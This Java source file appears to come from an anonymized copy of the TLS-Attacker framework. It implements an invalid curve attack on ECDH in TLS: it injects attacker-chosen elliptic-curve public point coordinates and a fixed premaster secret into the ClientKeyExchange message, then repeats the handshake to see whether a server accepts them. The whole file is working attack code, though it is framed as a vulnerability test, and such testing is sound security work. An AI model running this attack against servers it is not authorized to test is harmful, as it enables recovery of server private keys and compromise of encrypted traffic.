/**
 * TLS-Attacker - Anonymous submission
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package anonymous.tlsattacker.attacks.impl;

import anonymous.tlsattacker.tls.Attacker;
import anonymous.tlsattacker.attacks.config.InvalidCurveAttackCommandConfig;
import anonymous.tlsattacker.modifiablevariable.ModifiableVariableFactory;
import anonymous.tlsattacker.modifiablevariable.biginteger.BigIntegerModificationFactory;
import anonymous.tlsattacker.modifiablevariable.biginteger.ModifiableBigInteger;
import anonymous.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
import anonymous.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
import anonymous.tlsattacker.tls.config.ConfigHandler;
import anonymous.tlsattacker.tls.constants.HandshakeMessageType;
import anonymous.tlsattacker.tls.exceptions.WorkflowExecutionException;
import anonymous.tlsattacker.tls.protocol.handshake.ECDHClientKeyExchangeMessage;
import anonymous.tlsattacker.tls.util.LogLevel;
import anonymous.tlsattacker.tls.workflow.TlsContext;
import anonymous.tlsattacker.tls.workflow.WorkflowExecutor;
import anonymous.tlsattacker.tls.workflow.WorkflowTrace;
import anonymous.tlsattacker.transport.TransportHandler;
import java.math.BigInteger;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.bouncycastle.util.BigIntegers;

/**
 * 
 * @author anonymous anonymous <anonymous.anonymous@anonymous>
 */
public class InvalidCurveAttack extends Attacker<InvalidCurveAttackCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger(InvalidCurveAttack.class);

    /**
     * EC field size, currently set to 32, works for curves with 256 bits!
     * (TODO)
     */
    private static final int CURVE_FIELD_SIZE = 32;

    private static final int PROTOCOL_FLOWS = 15;

    public InvalidCurveAttack(InvalidCurveAttackCommandConfig config) {
	super(config);
    }

    @Override
    public void executeAttack(ConfigHandler configHandler) {

	if (config.getPublicPointBaseX() == null || config.getPublicPointBaseY() == null
		|| config.getPremasterSecret() == null) {

	    config.setPublicPointBaseX(new BigInteger(
		    "b70bf043c144935756f8f4578c369cf960ee510a5a0f90e93a373a21f0d1397f", 16));
	    config.setPublicPointBaseY(new BigInteger(
		    "4a2e0ded57a5156bb82eb4314c37fd4155395a7e51988af289cce531b9c17192", 16));
	    config.setPremasterSecret(new BigInteger(
		    "b70bf043c144935756f8f4578c369cf960ee510a5a0f90e93a373a21f0d1397f", 16));
	    for (int i = 0; i < PROTOCOL_FLOWS; i++) {
		try {
		    WorkflowTrace trace = executeProtocolFlow(configHandler);
		    if (trace.containsServerFinished()) {
			LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Vulnerable to the invalid curve attack.");
			return;
		    }
		} catch (WorkflowExecutionException ex) {
		    LOGGER.debug(ex.getLocalizedMessage());
		}
	    }
	    LOGGER.log(LogLevel.CONSOLE_OUTPUT, "NOT vulnerable to the invalid curve attack.");
	} else {
	    executeProtocolFlow(configHandler);
	}
    }

    private WorkflowTrace executeProtocolFlow(ConfigHandler configHandler) {
	TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
	TlsContext tlsContext = configHandler.initializeTlsContext(config);
	WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);

	WorkflowTrace trace = tlsContext.getWorkflowTrace();
	ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage) trace
		.getFirstHandshakeMessage(HandshakeMessageType.CLIENT_KEY_EXCHANGE);

	// modify public point base X coordinate
	ModifiableBigInteger x = ModifiableVariableFactory.createBigIntegerModifiableVariable();
	x.setModification(BigIntegerModificationFactory.explicitValue(config.getPublicPointBaseX()));
	message.setPublicKeyBaseX(x);

	// modify public point base Y coordinate
	ModifiableBigInteger y = ModifiableVariableFactory.createBigIntegerModifiableVariable();
	y.setModification(BigIntegerModificationFactory.explicitValue(config.getPublicPointBaseY()));
	message.setPublicKeyBaseY(y);

	// set explicit premaster secret value (X value of the resulting point
	// coordinate)
	ModifiableByteArray pms = ModifiableVariableFactory.createByteArrayModifiableVariable();
	byte[] explicitePMS = BigIntegers.asUnsignedByteArray(CURVE_FIELD_SIZE, config.getPremasterSecret());
	pms.setModification(ByteArrayModificationFactory.explicitValue(explicitePMS));
	message.setPremasterSecret(pms);

	workflowExecutor.executeWorkflow();

	tlsContexts.add(tlsContext);

	transportHandler.closeConnection();

	return trace;
    }

}
